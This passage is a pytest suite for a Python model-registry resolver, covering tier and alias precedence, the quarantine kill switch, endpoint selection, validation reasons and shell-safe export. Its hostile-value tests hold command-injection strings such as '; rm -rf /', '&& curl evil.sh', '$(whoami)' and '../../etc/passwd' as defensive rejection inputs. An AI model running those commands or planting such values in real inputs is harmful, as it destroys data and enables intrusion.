"""One model registry — the Python twin's resolution contract (TEAM-4995).

Two kinds of test here, deliberately:

  1. FIXTURE cases, parametrized from src/config/__fixtures__/models-registry.case.json
     — the shared table that pins the JS resolver and this one to the SAME answers.
     That file is authored by TEAM-4997 and may not be on this branch yet; when it
     is absent that ONE test skips and everything below still runs. The fixture is
     never forked or copied here — a second copy would be a second source of truth,
     which is the whole bug this ticket removes.

  2. Fixture-INDEPENDENT unit tests over small inline registries. These carry the
     real coverage: precedence order, the quarantine kill switch, retirement
     falling THROUGH rather than resolving, endpoint selection per CLI, and the
     two places a hostile value would escape (MODEL_ID_RE, `--export` quoting).

The module is imported directly (unlike main.py, which cannot be imported — it
installs Node.js and reads S3 at module scope). load_registry() is the only
function that touches boto3 and is exercised with a stubbed client.
"""

import importlib.util
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

RUNTIME_DIR = Path(__file__).resolve().parent.parent
REPO_ROOT = RUNTIME_DIR.parent.parent
MODULE_PATH = RUNTIME_DIR / "models_registry.py"
FIXTURE = REPO_ROOT / "src" / "config" / "__fixtures__" / "models-registry.case.json"


def _load_module():
    spec = importlib.util.spec_from_file_location("models_registry_under_test", MODULE_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


mr = _load_module()


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    """Every resolution tail reads env vars, so no test may inherit the runner's."""
    for var in ("MODEL_ID", "ANTHROPIC_MODEL", "CLAUDE_MODEL", "CODEX_MODEL",
                "BEDROCK_MANTLE_REGION", "AWS_REGION",
                "ARTIFACT_BUCKET", "AGENTCORE_HUB_ARTIFACT_BUCKET"):
        monkeypatch.delenv(var, raising=False)
    mr.reset_cache()


# ─── a registry small enough to read, big enough to be interesting ──────────

def _registry():
    """A document that VALIDATES, so every routing target below is routable.

    Every row something routes at carries a `price`, and the one `candidate` row
    carries both green probe planes — because validate_registry now refuses a
    document whose defaults/tiers/agents/legacyAliases point at an unpriced or
    half-probed row, exactly as the TS canonical does on its read path. A test
    registry without prices would be a document the hub itself would reject.
    """
    price = {"input": 3, "output": 15}
    return {
        "version": 3,
        "catalog": [
            {"modelId": "us.anthropic.claude-fable-5-1", "aliases": ["fable-5"],
             "endpoint": "bedrock-runtime", "region": "us-east-1", "api": "converse",
             "contextWindow": 500000, "price": {"input": 11, "output": 55}},
            {"modelId": "us.anthropic.claude-opus-5", "status": "active", "price": dict(price)},
            {"modelId": "us.anthropic.claude-sonnet-5", "status": "candidate",
             "price": dict(price), "probe": {"api": {"ok": True}, "cli": {"ok": True}}},
            {"modelId": "us.anthropic.claude-opus-4-1", "status": "retired"},
            {"modelId": "us.openai.gpt-6-sol", "endpoint": "bedrock-runtime",
             "region": "us-east-1", "api": "responses", "contextWindow": 300000,
             "price": dict(price)},
            {"modelId": "openai.gpt-5.5", "endpoint": "bedrock-mantle",
             "region": "us-east-2", "api": "responses", "price": dict(price)},
        ],
        "tiers": {
            "claude": {"fable": "us.anthropic.claude-fable-5-1",
                       "opus": "us.anthropic.claude-opus-5",
                       "sonnet": "us.anthropic.claude-sonnet-5"},
            "codex": {"sol": "us.openai.gpt-6-sol"},
        },
        "legacyAliases": {"claude-sonnet-45": "us.anthropic.claude-sonnet-5"},
        "agents": {"agentcore_hub_backend_dev": "us.anthropic.claude-opus-5"},
        "defaults": {"persona": "us.anthropic.claude-fable-5-1",
                     "codingClaude": "us.anthropic.claude-fable-5-1",
                     "codingCodex": "openai.gpt-5.5"},
    }


def _validated(doc=None):
    out, warnings, errors = mr.validate_registry(doc or _registry())
    assert errors == {}, errors
    return out


# ─── 1. the shared, language-neutral fixture ────────────────────────────────
#
# Reader for src/config/__fixtures__/models-registry.case.json. This block is
# byte-identical in the two Python test files (they are copies of each other for
# the reader, on purpose): a reader that drifts is how the first one came to read
# a schema the fixture never had and pass while asserting nothing.
#
# The real case shape is
#     {name, registry: "seed"|null, patch?, input: {kind, …}, expected: {…}}
# — `input` and `expected` are OBJECTS, and `registry` NAMES the bundled seed
# instead of carrying an inline document, so the rows under test are the ones
# production actually routes through.
#
# DELIBERATE NARROWING, stated here rather than hidden in a skip: this twin's
# resolve_model() returns a bare model id, resolve_agent_model() a bare id and
# resolve_coding_model() a 5-tuple. There is no `source`/`via`/`diagnostics`
# channel, because the fleet has no UI to render one. So every case's model id
# (and the coding endpoint tuple) is asserted here, while `source`, `via` and
# `diagnostics` are asserted by the TS canonical — and `source`, by the JS twin.

SEED_PATH = REPO_ROOT / "src" / "config" / "models.json"

# The fixture reads the BUNDLED SEED, so both paths have to be here for any of it
# to mean anything. When either is absent the fixture tests skip with the missing
# path named — never silently, because this block is the only proof the twins and
# the canonical agree, and a vacuous pass is the exact defect being fixed.
_MISSING = [str(p.relative_to(REPO_ROOT)) for p in (SEED_PATH, FIXTURE) if not p.exists()]
FIXTURE_SKIP = pytest.mark.skipif(
    bool(_MISSING),
    reason=(
        "the shared registry contract fixture is not on this branch yet: "
        + ", ".join(_MISSING or ["-"])
        + " — authored by the API dev's ticket (TEAM-4997) and present once that branch merges. "
        "The fixture-independent tests below carry the coverage until then."
    ),
)

# Fixture KINDS this twin does not implement, each with its reason. A silently
# skipped case is exactly how the previous reader stayed green while asserting
# nothing, so test_every_fixture_case_is_asserted_or_skipped_by_name fails the
# moment this map and the fixture disagree.
SKIPPED_KINDS = {
    "projection": (
        "no pricing projection in the Python twin: config/pricing.json is produced by the "
        "token-aggregator reconcile (mjs) and consumed by lambda/cost-report. The fleet runtime "
        "never prices a token, so porting price_of() here would create the fifth copy DL-033 "
        "exists to prevent."
    ),
}

# Named CASES that are a deliberate, documented behaviour difference rather than a
# missing kind. Empty: validate_registry now mirrors the canonical's read-time
# verdict reason for reason, so every validate case is asserted here too.
SKIPPED_CASES = {}


def _fixture_cases():
    if _MISSING:
        return []
    return json.loads(FIXTURE.read_text())["cases"]


def raw_registry_for(case):
    """The case's input document — mirror of rawRegistryFor() in the TS test.

    Typed patch ops rather than dotted paths: model ids contain dots, so
    "catalog.us.anthropic.claude-opus-5.price" would be ambiguous.
    """
    if case.get("registry") is None:
        return None
    assert case["registry"] == "seed", f"unknown registry {case['registry']!r}"
    raw = json.loads(SEED_PATH.read_text())
    patch = case.get("patch") or {}
    for key in ("defaults", "agents", "legacyAliases"):
        if key in patch:
            raw.setdefault(key, {}).update(patch[key])
    for cli, mapping in (patch.get("tiers") or {}).items():
        raw.setdefault("tiers", {}).setdefault(cli, {}).update(mapping)
    if "quarantine" in patch:
        raw["quarantine"] = list(patch["quarantine"])
    for row in patch.get("addRows") or []:
        raw["catalog"].append(json.loads(json.dumps(row)))
    for drop in patch.get("dropRowFields") or []:
        row = next((r for r in raw["catalog"] if r.get("modelId") == drop["modelId"]), None)
        assert row is not None, f"dropRowFields target {drop['modelId']} must exist in the seed"
        for field in drop["fields"]:
            row.pop(field, None)
    return raw


@FIXTURE_SKIP
@pytest.mark.parametrize("case", _fixture_cases() or [None],
                         ids=lambda c: (c or {}).get("name", "fixture-absent") if c else "fixture-absent")
def test_shared_fixture_cases(case, monkeypatch):
    """The Python twin must give the same answer as the TS canonical, case for case."""
    name = case["name"]
    kind = case["input"]["kind"]
    if name in SKIPPED_CASES:
        pytest.skip(SKIPPED_CASES[name])
    if kind in SKIPPED_KINDS:
        pytest.skip(SKIPPED_KINDS[kind])
    expected = case["expected"]
    raw = raw_registry_for(case)

    if kind == "validate":
        # Field path AND reason, not a substring: the reasons are the contract
        # (`unpriced` vs `inactive` decides what an operator goes and fixes), and
        # a substring match would pass on the right path with the wrong verdict.
        _registry, _warnings, errors = mr.validate_registry(raw)
        assert (errors == {}) is expected["ok"], errors
        for field, reason in expected["errors"].items():
            assert errors.get(field) == reason, (field, reason, errors)
        # The READ-time verdict: a non-None doc is what load_registry serves.
        # Defaults to `ok` — only NON_FATAL_READ_REASONS make the two differ.
        assert (_registry is not None) is expected.get("readable", expected["ok"]), (name, errors)
        return

    # PARSE, not validate: the fixture's resolve cases are defined over a
    # normalized document, the same way the canonical's resolveModel() takes a
    # registry rather than a verdict. `quarantined-id` is only expressible that
    # way — a document that quarantines a model its own tier points at is one the
    # read gate refuses, and the case is about what the RESOLVER does with it.
    registry, warnings = None, []
    if raw is not None:
        registry, warnings = mr.parse_registry(raw)
        assert registry is not None, f"{name}: this case's document must normalize"

    if kind == "parse":
        ids = [row["modelId"] for row in registry["models"]]
        for model_id in expected["catalogIdsInclude"]:
            assert model_id in ids, f"{name}: {model_id} must stay in the catalog"
        for model_id in expected["catalogIdsExclude"]:
            assert model_id not in ids, f"{name}: {model_id} must be dropped from the catalog"
        dated = [w for w in warnings if "dated duplicate" in w]
        want = [w for w in expected["warnings"] if w["reason"] == "dated_duplicate"]
        # Count, not just presence: a warning the fixture does not expect means
        # the twin dropped a row the canonical keeps.
        assert len(dated) == len(want), f"{name}: dated-duplicate warnings {dated}"
        for warning in want:
            assert any(warning["modelId"] in w for w in dated), (warning, dated)
        return

    for key, value in (case["input"].get("env") or {}).items():
        monkeypatch.setenv(key, value)

    # `expected.modelId: null` means the resolver must REFUSE and fall through —
    # the caller's next precedence step, never a guess. `expected.rejected` names
    # WHY, which only a loader with a diagnostics channel can assert; this twin
    # returns a bare id, so the refusal itself is what is pinned here.
    want = expected.get("modelId")

    if kind == "resolveModel":
        got = mr.resolve_model(registry, case["input"].get("value", ""), case["input"].get("cli"))
        assert got == want, name
    elif kind == "resolveAgentModel":
        got = mr.resolve_agent_model(registry, case["input"].get("agentId", ""),
                                     case["input"].get("override"))
        assert got == want, name
    elif kind == "resolveCodingModel":
        model_id, endpoint, region, api, _ctx_window = mr.resolve_coding_model(
            registry, case["input"].get("value") or "", case["input"].get("cli", "claude"))
        assert model_id == want, name
        if want is not None:
            assert (endpoint, region, api) == (
                expected["endpoint"], expected["region"], expected["api"]), name
    else:
        pytest.fail(f"{name}: unknown case kind {kind!r} — teach the reader, do not skip it")


@FIXTURE_SKIP
def test_every_fixture_case_is_asserted_or_skipped_by_name():
    """No case may be dropped, and no skip may outlive its case.

    There is deliberately NO hardcoded case count: the API dev adds cases to the
    fixture on their own branch, and a count here would turn every addition into
    a red build on this one. What must hold is the ACCOUNTING — every case is
    either asserted or named in a skip list with a reason.
    """
    cases = _fixture_cases()
    names = [c["name"] for c in cases]
    kinds = {c["input"]["kind"] for c in cases}
    assert len(names) == len(set(names)), "duplicate case name"
    assert len(names) >= 20, f"the fixture looks truncated: {len(names)} cases"
    stale = set(SKIPPED_CASES) - set(names)
    assert stale == set(), f"skip list names cases the fixture no longer has: {stale}"
    stale_kinds = set(SKIPPED_KINDS) - kinds
    assert stale_kinds == set(), f"skipped kinds the fixture no longer has: {stale_kinds}"
    unhandled = [
        c["name"] for c in cases
        if c["input"]["kind"] not in ("resolveModel", "resolveAgentModel", "resolveCodingModel",
                                      "parse", "validate")
        and c["name"] not in SKIPPED_CASES and c["input"]["kind"] not in SKIPPED_KINDS
    ]
    assert unhandled == [], f"cases whose kind no branch of the reader handles: {unhandled}"


@FIXTURE_SKIP
def test_the_bundled_seed_validates_as_is():
    """The seed the hub ships must be readable by this twin unchanged.

    The canonical adds row fields the twin does not resolve on (`harnessLanes`,
    `lanes`); a tolerant parser must carry them through rather than drop the row.
    `price`, `readOnly`, `probe` and `status` ARE read now — they are what
    validate_registry checks a routing target against.
    """
    registry, _warnings, errors = mr.validate_registry(json.loads(SEED_PATH.read_text()))
    assert errors == {}, errors
    assert len(registry["models"]) == 21
    row = next(r for r in registry["models"] if r["modelId"] == "us.anthropic.claude-fable-5-1")
    assert row["price"]["input"] == 11
    # `quarantine` is a resolution refusal, never a row drop; and `readOnly` bars
    # a row from being a ROUTING TARGET, not from being asked for by name — the
    # eval judge's read-only row still resolves when a caller names it.
    assert mr.resolve_model(registry, "anthropic.claude-opus-5") == "anthropic.claude-opus-5"


# ─── 2. resolve_model precedence ────────────────────────────────────────────

def test_tier_resolves_per_cli():
    reg = _validated()
    assert mr.resolve_model(reg, "opus", "claude") == "us.anthropic.claude-opus-5"
    assert mr.resolve_model(reg, "sol", "codex") == "us.openai.gpt-6-sol"


def test_a_tier_is_scoped_to_its_cli():
    # "sol" is a Codex tier; asking as claude must NOT cross the wires.
    reg = _validated()
    assert mr.resolve_model(reg, "sol", "claude") is None
    assert mr.resolve_model(reg, "opus", "codex") is None


def test_quarantine_beats_a_tier_and_an_explicit_id():
    # Only the MODEL ID is quarantined here, deliberately: the kill switch is a
    # list of models, and an operator must not have to also guess every tier word
    # and alias that reaches one. This used to pass only because "opus" was in
    # the list too -- the re-check after resolution is what makes it real.
    #
    # The list is set AFTER validation on purpose. A document that ROUTES at a
    # quarantined model is now refused outright (see the validate tests below),
    # matching the hub, so the only way to observe the resolver's re-check on the
    # tier path is a registry quarantined after it was read — which is exactly
    # what a cached registry plus a fresh kill switch looks like.
    reg = _validated()
    reg["quarantine"] = ["us.anthropic.claude-opus-5"]
    assert mr.resolve_model(reg, "opus", "claude") is None
    assert mr.resolve_model(reg, "us.anthropic.claude-opus-5") is None


def test_quarantine_is_rechecked_after_tier_and_alias_resolution():
    """Every route to a quarantined model is refused, not just its raw id."""
    reg = _validated()
    reg["quarantine"] = ["us.anthropic.claude-fable-5-1", "us.anthropic.claude-sonnet-5"]
    assert mr.resolve_model(reg, "fable", "claude") is None          # via tiers
    assert mr.resolve_model(reg, "fable-5") is None                  # via a row alias
    assert mr.resolve_model(reg, "claude-sonnet-45") is None         # via legacyAliases
    assert mr.resolve_model(reg, "us.anthropic.claude-fable-5-1") is None
    # A quarantined ROW status is refused the same way, with or without the list.
    reg = _validated()
    next(r for r in reg["models"] if r["modelId"] == "us.anthropic.claude-opus-5")["status"] = "quarantined"
    assert mr.resolve_model(reg, "opus", "claude") is None


def test_a_tier_word_is_matched_exactly_not_case_folded():
    # Tier words are document KEYS, not user prose. Case-folding them made "OPUS"
    # resolve on the fleet and not in the hub, whose resolver is exact-case.
    reg = _validated()
    assert mr.resolve_model(reg, "opus", "claude") == "us.anthropic.claude-opus-5"
    assert mr.resolve_model(reg, "OPUS", "claude") is None
    assert mr.resolve_model(reg, "Opus", "claude") is None
    assert mr.resolve_model(reg, "SOL", "codex") is None


def test_legacy_alias_still_resolves():
    assert mr.resolve_model(_validated(), "claude-sonnet-45") == "us.anthropic.claude-sonnet-5"


def test_row_alias_resolves_and_candidate_status_is_usable():
    reg = _validated()
    assert mr.resolve_model(reg, "fable-5") == "us.anthropic.claude-fable-5-1"
    assert mr.resolve_model(reg, "us.anthropic.claude-sonnet-5") == "us.anthropic.claude-sonnet-5"


def test_retired_row_does_not_resolve():
    # It falls THROUGH (None) so the caller drops to its next precedence step —
    # resolving a withdrawn model anyway is the bug this replaces.
    assert mr.resolve_model(_validated(), "us.anthropic.claude-opus-4-1") is None


def test_unknown_id_with_a_dot_passes_through():
    # A model published after the last reconcile must still be usable.
    assert mr.resolve_model(_validated(), "us.anthropic.claude-nova-9") == "us.anthropic.claude-nova-9"


def test_unknown_bare_word_does_not_pass_through():
    assert mr.resolve_model(_validated(), "bigmodel") is None
    assert mr.resolve_model(_validated(), "") is None
    assert mr.resolve_model(_validated(), None) is None


def test_a_none_registry_behaves_as_empty():
    # No tiers, no aliases, no catalog — but passthrough and the literal tails work.
    assert mr.resolve_model(None, "opus", "claude") is None
    assert mr.resolve_model(None, "us.anthropic.claude-opus-5") == "us.anthropic.claude-opus-5"


# ─── 3. resolve_agent_model precedence ──────────────────────────────────────

def test_agent_override_wins():
    reg = _validated()
    assert mr.resolve_agent_model(reg, "agentcore_hub_backend_dev", "sonnet") == \
        "us.anthropic.claude-sonnet-5"


def test_agent_pin_beats_the_default():
    reg = _validated()
    assert mr.resolve_agent_model(reg, "agentcore_hub_backend_dev") == "us.anthropic.claude-opus-5"
    assert mr.resolve_agent_model(reg, "agentcore_hub_qa_verifier") == "us.anthropic.claude-fable-5-1"


def test_an_unresolvable_override_falls_through_to_the_pin():
    reg = _validated()
    assert mr.resolve_agent_model(reg, "agentcore_hub_backend_dev", "nonsense") == \
        "us.anthropic.claude-opus-5"


def test_env_fallback_when_there_is_no_registry(monkeypatch):
    monkeypatch.setenv("MODEL_ID", "us.anthropic.claude-haiku-4-5")
    assert mr.resolve_agent_model(None, "whoever") == "us.anthropic.claude-haiku-4-5"


def test_quarantine_beats_the_env_var(monkeypatch):
    doc = _registry()
    doc["defaults"] = {}
    doc["agents"] = {}
    doc["legacyAliases"] = {}
    doc["tiers"] = {}
    doc["quarantine"] = ["us.anthropic.claude-opus-5"]
    monkeypatch.setenv("MODEL_ID", "us.anthropic.claude-opus-5")
    # Nothing routes at the quarantined model, so the document is still valid —
    # the kill switch alone is what refuses the operator's env var.
    reg = _validated(doc)
    assert mr.resolve_agent_model(reg, "nobody") == mr.LITERAL_PERSONA


def test_literal_fallback_is_the_last_resort():
    assert mr.resolve_agent_model(None, "whoever") == mr.LITERAL_PERSONA
    assert mr.LITERAL_PERSONA == "us.anthropic.claude-fable-5-1"


# ─── 4. resolve_coding_model, per endpoint ──────────────────────────────────

def test_coding_claude_tier_carries_bedrock_runtime_converse():
    model, endpoint, region, api, ctx = mr.resolve_coding_model(_validated(), "fable", "claude")
    assert (model, endpoint, region, api, ctx) == (
        "us.anthropic.claude-fable-5-1", "bedrock-runtime", "us-east-1", "converse", 500000)


def test_coding_codex_tier_on_bedrock_runtime_keeps_its_own_region():
    model, endpoint, region, api, ctx = mr.resolve_coding_model(_validated(), "sol", "codex")
    assert (model, endpoint, region, api, ctx) == (
        "us.openai.gpt-6-sol", "bedrock-runtime", "us-east-1", "responses", 300000)


def test_coding_codex_default_lands_on_mantle():
    model, endpoint, region, api, _ = mr.resolve_coding_model(_validated(), "", "codex")
    assert (model, endpoint, region, api) == ("openai.gpt-5.5", "bedrock-mantle", "us-east-2", "responses")


def test_coding_env_fallback_per_cli(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_MODEL", "us.anthropic.claude-opus-5")
    monkeypatch.setenv("CODEX_MODEL", "openai.gpt-5.4")
    assert mr.resolve_coding_model(None, "", "claude")[0] == "us.anthropic.claude-opus-5"
    assert mr.resolve_coding_model(None, "", "codex")[0] == "openai.gpt-5.4"


def test_claude_model_is_the_second_claude_env_name(monkeypatch):
    monkeypatch.setenv("CLAUDE_MODEL", "us.anthropic.claude-sonnet-5")
    assert mr.resolve_coding_model(None, "", "claude")[0] == "us.anthropic.claude-sonnet-5"


def test_coding_literal_fallback_endpoints():
    assert mr.resolve_coding_model(None, "", "claude") == (
        mr.LITERAL_CODING_CLAUDE, "bedrock-runtime", "us-east-1", "converse", 400000)
    assert mr.resolve_coding_model(None, "", "codex") == (
        mr.LITERAL_CODING_CODEX, "bedrock-mantle", "us-east-2", "responses", 400000)


def test_a_tier_name_without_a_registry_falls_back_to_the_default():
    # There is no literal tier map any more: with no registry, "opus" cannot be
    # resolved and the caller gets the documented default rather than a guess.
    assert mr.resolve_coding_model(None, "opus", "claude")[0] == mr.LITERAL_CODING_CLAUDE


def test_mantle_region_env_is_only_read_for_mantle(monkeypatch):
    monkeypatch.setenv("BEDROCK_MANTLE_REGION", "eu-west-1")
    monkeypatch.setenv("AWS_REGION", "us-west-2")
    assert mr.resolve_coding_model(None, "", "codex")[2] == "eu-west-1"
    assert mr.resolve_coding_model(None, "", "claude")[2] == "us-west-2"


def test_base_url_per_endpoint():
    assert mr.base_url_for("bedrock-runtime", "us-east-1") == \
        "https://bedrock-runtime.us-east-1.amazonaws.com/openai/v1"
    assert mr.base_url_for("bedrock-mantle", "us-east-2") == \
        "https://bedrock-mantle.us-east-2.api.aws/openai/v1"


# ─── 5. hostile values ──────────────────────────────────────────────────────

@pytest.mark.parametrize("bad", [
    "; rm -rf /",
    "us.anthropic.claude-5 && curl evil.sh",
    "$(whoami)",
    "../../etc/passwd",
    "a" * 200,
    "-leading-dash",
])
def test_model_id_re_rejects(bad):
    assert not mr.MODEL_ID_RE.match(bad)


def test_a_hostile_row_is_dropped_not_resolved():
    doc = _registry()
    doc["catalog"].append({"modelId": "evil; rm -rf /"})
    reg = _validated(doc)
    assert mr.resolve_model(reg, "evil; rm -rf /") is None
    assert all(m["modelId"] != "evil; rm -rf /" for m in reg["models"])


def test_a_row_with_a_hostile_region_is_dropped():
    # The region is interpolated into a base URL and a shell eval, so a value
    # that is not REGION_RE makes the ROW unusable rather than being sanitized.
    doc = _registry()
    doc["catalog"].append({"modelId": "us.openai.gpt-6-luna", "region": "us-east-1; rm -rf /"})
    reg = _validated(doc)
    assert all(m["modelId"] != "us.openai.gpt-6-luna" for m in reg["models"])
    # The id still passes through (it looks like a model id), but with no row
    # there is no hostile region to carry: the endpoint default applies.
    assert mr.resolve_coding_model(reg, "us.openai.gpt-6-luna", "codex")[2] == "us-east-2"


def test_a_hostile_region_on_a_REFERENCED_row_invalidates_the_document():
    # Dropping the row the defaults point at would silently change which model
    # runs, so the whole document is refused and the caller falls back loudly.
    doc = _registry()
    doc["catalog"][0]["region"] = "us-east-1; rm -rf /"
    out, warnings, errors = mr.validate_registry(doc)
    assert out is None
    assert errors["defaults.persona"] == "unknown_model"


@pytest.mark.parametrize("hostile", ["sol; rm -rf /", "$(id)", "a b c"])
def test_export_never_emits_an_unquoted_hostile_value(hostile):
    out = subprocess.run(
        [sys.executable, str(MODULE_PATH), "--export", "codex", hostile],
        capture_output=True, text=True,
        env={k: v for k, v in os.environ.items()
             if k not in ("ARTIFACT_BUCKET", "AGENTCORE_HUB_ARTIFACT_BUCKET")},
    )
    assert out.returncode == 0, out.stderr
    assert hostile not in out.stdout  # never reaches the eval at all
    assert "CODEX_RESOLVED_MODEL=openai.gpt-5.5" in out.stdout


def test_export_prints_both_sets_and_exits_zero():
    out = subprocess.run(
        [sys.executable, str(MODULE_PATH), "--export", "claude", "codex"],
        capture_output=True, text=True,
        env={k: v for k, v in os.environ.items()
             if k not in ("ARTIFACT_BUCKET", "AGENTCORE_HUB_ARTIFACT_BUCKET")},
    )
    assert out.returncode == 0
    for var in ("CLAUDE_RESOLVED_MODEL", "CLAUDE_ENDPOINT", "CLAUDE_REGION", "CLAUDE_API",
                "CODEX_RESOLVED_MODEL", "CODEX_ENDPOINT", "CODEX_REGION", "CODEX_API",
                "CODEX_BASE_URL", "CODEX_CONTEXT_WINDOW"):
        assert f"export {var}=" in out.stdout, var
    # BEDROCK_MANTLE_REGION is mantle-only and must never be exported by us —
    # exporting it would hand a Mantle region to a bedrock-runtime model.
    assert "BEDROCK_MANTLE_REGION=" not in out.stdout


def test_export_with_no_cli_is_a_usage_error():
    out = subprocess.run([sys.executable, str(MODULE_PATH), "--export", "sol"],
                         capture_output=True, text=True)
    assert out.returncode == 2


# ─── 6. validate_registry ───────────────────────────────────────────────────

def test_a_malformed_row_is_dropped_with_a_warning():
    doc = _registry()
    doc["catalog"].append({"nope": 1})
    out, warnings, errors = mr.validate_registry(doc)
    assert errors == {}
    assert any("dropped" in w for w in warnings)


def test_a_dangling_default_invalidates_the_whole_document():
    doc = _registry()
    doc["defaults"]["persona"] = "us.anthropic.claude-does-not-exist"
    out, warnings, errors = mr.validate_registry(doc)
    assert out is None and errors


def test_a_dangling_tier_invalidates_the_whole_document():
    doc = _registry()
    doc["tiers"]["claude"]["opus"] = "gone"
    out, _, errors = mr.validate_registry(doc)
    assert out is None and errors


def test_a_dropped_row_referenced_by_a_tier_invalidates_the_document():
    doc = _registry()
    doc["catalog"] = [m for m in doc["catalog"] if m["modelId"] != "us.anthropic.claude-opus-5"]
    doc["catalog"].append({"modelId": "us.anthropic.claude-opus-5", "status": "banana"})
    out, warnings, errors = mr.validate_registry(doc)
    assert out is None
    assert any("dropped" in w for w in warnings)
    assert errors["tiers.claude.opus"] == "unknown_model"


# Every reason targetReason() in src/lib/models-registry.ts can return, on every
# field family it is applied to. This is the divergence the round-1 review found:
# the twin used to error only on a DANGLING reference, so it happily served a
# registry the hub refuses — and the fleet then ran a model the console said was
# retired, unpriced or quarantined.
def test_a_routing_target_reports_the_canonical_reason():
    cases = {
        "bad_model_id": lambda d: d["defaults"].update(persona="us.anthropic.claude-opus-5; rm -rf /"),
        "unknown_model": lambda d: d["defaults"].update(persona="us.anthropic.claude-nope"),
        "inactive": lambda d: d["defaults"].update(persona="us.anthropic.claude-opus-4-1"),
        "unpriced": lambda d: d["catalog"][0].pop("price"),
        "read_only": lambda d: d["catalog"][0].update(readOnly=True),
        "quarantined": lambda d: d.update(quarantine=["us.anthropic.claude-fable-5-1"]),
        "unprobed": lambda d: d["catalog"][0].update(status="candidate"),
    }
    for reason, mutate in cases.items():
        doc = _registry()
        mutate(doc)
        out, _warnings, errors = mr.validate_registry(doc)
        assert errors["defaults.persona"] == reason, (reason, errors)
        # `unprobed` is reported but NOT fatal at read time (NON_FATAL_READ_REASONS):
        # a routed candidate that failed a re-probe must not drop the whole fleet to
        # env/literal (TEAM-5016 finding 1). Every other reason refuses the document.
        if reason in mr.NON_FATAL_READ_REASONS:
            assert out is not None, reason
        else:
            assert out is None, reason


def test_a_half_probed_candidate_is_unprobed_on_either_plane():
    # BOTH planes: a model that answers the API but not the coding CLI is
    # half-proven, and `or` here would let a single green probe adopt it.
    for probe in ({"api": {"ok": True}, "cli": {"ok": False}},
                  {"api": {"ok": False}, "cli": {"ok": True}},
                  {"api": {"ok": True}},
                  {}):
        doc = _registry()
        doc["catalog"][0]["status"] = "candidate"
        doc["catalog"][0]["probe"] = probe
        out, _warnings, errors = mr.validate_registry(doc)
        assert errors["defaults.persona"] == "unprobed", probe
        assert out is not None, probe   # reported, still readable
    doc = _registry()
    doc["catalog"][0]["status"] = "candidate"
    doc["catalog"][0]["probe"] = {"api": {"ok": True}, "cli": {"ok": True}}
    assert _validated(doc) is not None


def test_a_quarantined_routing_target_is_refused_on_every_field_family():
    # The hub's read path refuses the document for ANY of these, so the twin does
    # too — a tier still pointing at a killed model is an operator error to fix,
    # not something to resolve through.
    field_for = {
        "defaults.persona": lambda d: d["defaults"].update(persona="us.anthropic.claude-opus-5"),
        "tiers.claude.opus": lambda d: None,
        "agents.agentcore_hub_backend_dev": lambda d: None,
        "legacyAliases.claude-sonnet-45": lambda d: d["legacyAliases"].update(
            {"claude-sonnet-45": "us.anthropic.claude-opus-5"}),
    }
    for field, mutate in field_for.items():
        doc = _registry()
        doc["quarantine"] = ["us.anthropic.claude-opus-5"]
        mutate(doc)
        out, _warnings, errors = mr.validate_registry(doc)
        assert out is None, field
        assert errors[field] == "quarantined", (field, errors)


def test_a_routing_target_reason_survives_an_alias_hop():
    # The target is spelled as an ALIAS of the offending row: resolving the alias
    # before judging it is what makes the twin agree with the canonical, which
    # indexes byId and byAlias alike.
    doc = _registry()
    doc["defaults"]["persona"] = "fable-5"
    assert _validated(doc) is not None
    doc = _registry()
    doc["defaults"]["persona"] = "fable-5"
    doc["catalog"][0].pop("price")
    _out, _warnings, errors = mr.validate_registry(doc)
    assert errors["defaults.persona"] == "unpriced", errors


def test_a_malformed_legacy_alias_KEY_is_an_error():
    doc = _registry()
    doc["legacyAliases"]["nope; rm -rf /"] = "us.anthropic.claude-opus-5"
    _out, _warnings, errors = mr.validate_registry(doc)
    assert errors["legacyAliases.nope; rm -rf /"] == "bad_model_id"


def test_a_duplicate_model_id_is_dropped():
    doc = _registry()
    doc["catalog"].append({"modelId": "us.anthropic.claude-opus-5", "aliases": ["dup"]})
    out, warnings, _ = mr.validate_registry(doc)
    assert any("duplicate" in w for w in warnings)
    assert mr.resolve_model(out, "dup") is None


def test_an_alias_two_rows_claim_is_a_duplicate_alias_error():
    # Resolution ORDER would otherwise decide which model — and therefore which
    # price — "fable-5" means. The canonical errors on it, keyed by the row that
    # tried to claim it second, so this does too.
    doc = _registry()
    doc["catalog"][1]["aliases"] = ["fable-5"]  # already owned by the fable row
    out, warnings, errors = mr.validate_registry(doc)
    assert out is None
    assert errors["catalog.us.anthropic.claude-opus-5.aliases.fable-5"] == "duplicate_alias"
    assert any("ambiguous" in w for w in warnings)


def test_an_alias_colliding_with_a_legacyAliases_key_is_dropped_not_fatal():
    # The one tolerated collision, and the reason is stated rather than hidden:
    # the canonical ignores legacyAliases when checking catalog aliases, and
    # dropping the alias leaves the row reachable by id — so refusing the whole
    # document over a compatibility shim would make this twin STRICTER than the
    # hub, which is the same divergence in the other direction.
    doc = _registry()
    doc["catalog"][1]["aliases"] = ["claude-sonnet-45"]  # a legacyAliases key
    out, warnings, errors = mr.validate_registry(doc)
    assert errors == {}, errors
    assert any("ambiguous" in w for w in warnings)
    assert mr.resolve_model(out, "claude-sonnet-45") == "us.anthropic.claude-sonnet-5"
    assert mr.resolve_model(out, "us.anthropic.claude-opus-5") == "us.anthropic.claude-opus-5"


def test_a_malformed_alias_is_a_bad_model_id_error():
    doc = _registry()
    doc["catalog"][1]["aliases"] = ["opus; rm -rf /"]
    out, _warnings, errors = mr.validate_registry(doc)
    assert out is None
    assert errors["catalog.us.anthropic.claude-opus-5.aliases.opus; rm -rf /"] == "bad_model_id"


def test_a_dated_duplicate_folds_into_its_base_id():
    doc = _registry()
    doc["catalog"].append({"modelId": "us.anthropic.claude-opus-5-20251001-v1:0"})
    out, warnings, _ = mr.validate_registry(doc)
    assert any("dated duplicate" in w for w in warnings)
    assert mr.resolve_model(out, "us.anthropic.claude-opus-5-20251001-v1:0") == \
        "us.anthropic.claude-opus-5"


def test_a_dated_duplicate_that_something_routes_at_is_kept():
    # Routing outranks tidiness: folding a tier's target would make the tier
    # resolve to a DIFFERENT model than the operator wrote. Mirror of
    # routingTargets() in src/lib/models-registry.ts.
    doc = _registry()
    dated = "us.anthropic.claude-opus-5-20251001-v1:0"
    doc["catalog"].append({"modelId": dated, "price": {"input": 3, "output": 15}})
